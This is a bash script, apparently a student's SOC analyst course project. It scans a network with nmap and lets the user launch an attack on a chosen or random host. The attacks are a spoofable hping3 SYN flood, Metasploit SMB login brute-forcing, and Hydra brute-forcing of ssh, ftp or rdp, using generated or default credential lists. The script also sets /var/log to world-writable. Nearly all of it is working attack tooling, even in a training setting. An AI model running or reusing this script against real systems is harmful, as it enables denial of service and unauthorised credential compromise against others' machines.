#!/bin/bash

#SOC Analyst Project
#Student Name : Samson Xiao
#Student Code : s30
#Class Code : cfc0202
#Lecturer : James Lim

sgtime=$(TZ=Asia/Singapore date)

function DOSATTACK()
{
	echo 'Please specify port to attack.'
	read victimPort
	sleep 1
	echo 'Please specify amount of packets to send.'
	read packetCount
	sleep 1
	echo 'Please specify data size per packet.(Maximum size 65495)'
	read packetSize
	sleep 1
	echo 'Do you want to spoof your ip?'
	echo '1. Yes, spoof my IP please'
	echo '2. No, do not spoof my IP'
	read -p "[1/2]" OPTION
	case $OPTION in
		1)
			echo 'Please enter your preferred IP to spoof as'
			read spoofedIP
			echo "Commencing attack on IP-$victimIP port-$victimPort with spoofed IP $spoofedIP"
			sleep 1
			sudo hping3 -S $victimIP -p $victimPort -c $packetCount -d $packetSize -a $spoofedIP			
		;;
		
		2)
			echo "Commencing attack on  IP-$victimIP port-$victimPort"
			sleep 1
			sudo hping3 -S $victimIP -p $victimPort -c $packetCount -d $packetSize
		;;
		esac
echo "$sgtime hping3 DOSAttack on $victimIP completed" >> /var/log/soc.log
}

function SMBATTACK()
{
echo 'Generating password and user list'
	read -p "Would you like to customise password and user list? [Y/N]" OPTION
	echo ' '
	case $OPTION in
		Y|y)
			echo 'Please choose minimum length of password'
			read passMin
			echo 'Please choose maximum length of password'
			read passMax
			echo 'Please type out chars, numbers or special chars to include in password'
			echo 'Example - 0123456789abcdefghijklmnop!@#$'
			echo 'Warning - a longer password list will take a longer time for attack to complete'
			read passChars
			sleep 1
			echo 'Please choose minimum length of username'
			read userMin
			echo 'Please choose maximum length of username'
			read userMax
			echo 'Please type out chars, numbers or special chars to include in username'
			echo 'Example - 0123456789abcdefghijklmnop!@#$'
			echo 'Warning - a longer user list will take a longer time for attack to complete'
			read userChars
			sleep 1
			echo 'Generating password list.'
			crunch $passMin $passMax $passChars > pass.lst
			echo 'Generating username list.'
			crunch $userMin $userMax $userChars > user.lst		
		;;
		
		N|n)
			echo 'Auto generating user and password list.'
			echo 'admin' > user.lst
			echo 'root' >> user.lst
			echo 'IEUser' >> user.lst
			echo 'soc1' >> user.lst
			echo 'Administrator' >> user.lst
			echo 'User list OK'
			sleep 1
			echo 'password!' > pass.lst
			echo 'P@ssw0rd!' >> pass.lst
			echo 'p@ssword!' >> pass.lst
			echo 'PASSWORD!' >> pass.lst
			echo 'Passw0rd!' >> pass.lst
			echo 'Password list OK'
		;;
		esac
	echo 'Please specify smbdomain for attack'
	read victimDomain
	echo 'Setting up SMBattack.. Please wait....'
	sleep 1
	echo 'use auxiliary/scanner/smb/smb_login' > neko.rc
	echo "set rhosts $victimIP" >> neko.rc
	echo "set smbdomain $victimDomain" >> neko.rc
	echo 'set pass_file pass.lst' >> neko.rc
	echo 'set user_file user.lst' >> neko.rc
	echo 'run' >> neko.rc
	echo 'exit' >> neko.rc
	
	echo 'SMB attack set up complete..'
	echo 'Commencing attack in 3seconds..'
	sleep 3
	echo 'Attacking..'
	
	msfconsole -qr neko.rc -o "/var/log/$victimIP.txt"
	
	echo "$sgtime msfconsole SMBAttack on $victimIP completed" >> /var/log/soc.log
	echo "$sgtime msfconsole SMBAttack on $victimIP Results saved to /var/log/$victimIP.txt" >> /var/log/soc.log
}

function BRUTEFORCE()
{
echo 'Generating password and user list'
	read -p "Would you like to customise password and user list? [Y/N]" OPTION
	echo ' '
	case $OPTION in
		Y|y)
			echo 'Please choose minimum length of password'
			read passMin
			echo 'Please choose maximum length of password'
			read passMax
			echo 'Please type out chars, numbers or special chars to include in password'
			echo 'Example - 0123456789abcdefghijklmnop!@#$'
			echo 'Warning - a longer password list will take a longer time for attack to complete'
			read passChars
			sleep 1
			echo 'Please choose minimum length of username'
			read userMin
			echo 'Please choose maximum length of username'
			read userMax
			echo 'Please type out chars, numbers or special chars to include in username'
			echo 'Example - 0123456789abcdefghijklmnop!@#$'
			echo 'Warning - a longer user list will take a longer time for attack to complete'
			read userChars
			sleep 1
			echo 'Generating password list.'
			crunch $passMin $passMax $passChars > pass.lst
			echo 'Generating username list.'
			crunch $userMin $userMax $userChars > user.lst		
		;;
		
		N|n)
			echo 'Auto generating user and password list.'
			echo 'admin' > user.lst
			echo 'root' >> user.lst
			echo 'IEUser' >> user.lst
			echo 'soc1' >> user.lst
			echo 'Administrator' >> user.lst
			echo 'User list OK'
			sleep 1
			echo 'password!' > pass.lst
			echo 'P@ssw0rd!' >> pass.lst
			echo 'p@ssword!' >> pass.lst
			echo 'PASSWORD!' >> pass.lst
			echo 'Passw0rd!' >> pass.lst
			echo 'Password list OK'
		;;
		esac
		
echo 'Please specify services to attack..'
echo 'Example - ssh ftp rdp'
read hydraService

echo 'Commencing Hydra attack in 3 seconnds..'
sleep 3 
hydra -L user.lst -P pass.lst $victimIP $hydraService -o "/var/log/$victimIP.hydra.txt"

echo "$sgtime hydra bruteforce on $victimIP completed" >> /var/log/soc.log
echo "$sgtime hydra bruteforce on $victimIP Results saved to /var/log/$victimIP.hydra.txt" >> /var/log/soc.log
}

cd /var/log
sudo chmod 777 /var/log
sudo mkdir SOCAnalystAttack
sudo chmod 777 /var/log/SOCAnalystAttack 
cd SOCAnalystAttack
echo 'SOC Analyst Project'
echo 'Please enter IPv4 or IPv4/MASK to scan'
read IPtoSCAN
sleep 2
echo "Scanning $IPtoSCAN"
sudo nmap $IPtoSCAN -Pn -F -oG Scanned.gnmap


echo "$sgtime nmap scan on $IPtoSCAN completed" >> /var/log/soc.log
sudo cat Scanned.gnmap | grep Up | awk '{print $2,$4,$5}' > ScannedIP.txt
sudo cat ScannedIP.txt >> /var/log/soc.log

sleep 2
echo ' '
echo ' '
echo 'Scanned results'
cat ScannedIP.txt | awk '{print $1}'
echo 'Please choose a IP Address from the list above to attack'
echo 'Or type in random for a random IP'
read chosenIP

RandomIP=$(echo -n $chosenIP | grep -i random | wc -l)

if [ $RandomIP -ge 1 ]
then
	victimIP=$(shuf -n 1 ScannedIP.txt | awk '{print $1}')
else
	victimIP=$chosenIP
fi

sleep 2	
echo ' '
echo "$victimIP chosen"
echo 'Checking if IP chosen is valid'
echo ' '
sleep 2

ValidIP=$(cat ScannedIP.txt | grep "$victimIP" | wc -l)

if [ $ValidIP -ge 1 ]
then 
	echo 'Valid IP, please proceed on to attack choice.'
else
	echo 'Invalid IP, please restart script'
	sleep 3
	rm -rf /var/log/SOCAnalystAttack
	sudo chmod 755 /var/log
	exit
fi

sleep 2
read -p "
1. hping3 DOS attack
	Flooding and overwhelming victim's machine with requests
	until normal traffic can no longer be processed.
2. SMB attack
	This version of SMB attack is a simplified one where we attack
	port 445(SMB port commonly used for filesharing) specifically and
	bruteforce with a user and password list to get credentials.
3. Bruteforcing
	A Bruteforce attack uses trial and error to guess login info,
	encryption keys, or find a hidden webpage. Hydra is used in this
	specific attack to try and guess the victim's login user and 
	password.
4. Random
	Random choice between the list above. For the indecisive. :D
Please select which attack to commence [1/2/3/4]" ATTACKS
	echo ' '
		case $ATTACKS in
			1)
				echo 'DOS attack chosen'
				echo "$sgtime hping3 DOSAttack on $victimIP started" >> /var/log/soc.log
				DOSATTACK
			;;	
		
			2)
				echo 'SMB attack chosen'
				echo "$sgtime msfconsole SMBAttack on $victimIP started" >> /var/log/soc.log
				SMBATTACK
			;;
	
			3)
				echo 'Bruteforcing chosen'
				echo "$sgtime hydra bruteforce on $victimIP started" >> /var/log/soc.log
				BRUTEFORCE
			;;
			
			4)
				echo 'Random Attack Chosen'
				shuf -e BRUTEFORCE DOSATTACK SMBATTACK > attacks.txt
					
				bruteATT=$(cat attacks.txt | head -1 | grep -i bruteforce | wc -l)
				dosATT=$(cat attacks.txt | head -1 | grep -i dosattack | wc -l)
				smbATT=$(cat attacks.txt | head -1 | grep -i smbattack | wc -l)

				if [ $bruteATT -lt 1 ]
				then
					if [ $dosATT -lt 1 ]
					then
						if [ $smbATT -lt 1 ]
						then
							echo 'Something went wrong.. Restart Script'
							exit
						else
							echo 'Randomizer choice : SMB ATTACK'
							sleep 2
							SMBATTACK
						fi
					else
						echo 'Randomizer choice : DOS ATTACK'
						sleep 2
						DOSATTACK
					fi
				else
					echo 'Randomizer choice : BRUTE FORCE ATTACK'
					sleep 2
					BRUTEFORCE
				fi
			;;	
		esac
		
sleep 2
echo ' '
echo 'Attack done, logs saved to /var/log/soc.log'
rm -rf /var/log/SOCAnalystAttack
sudo chmod 755 /var/log

exit
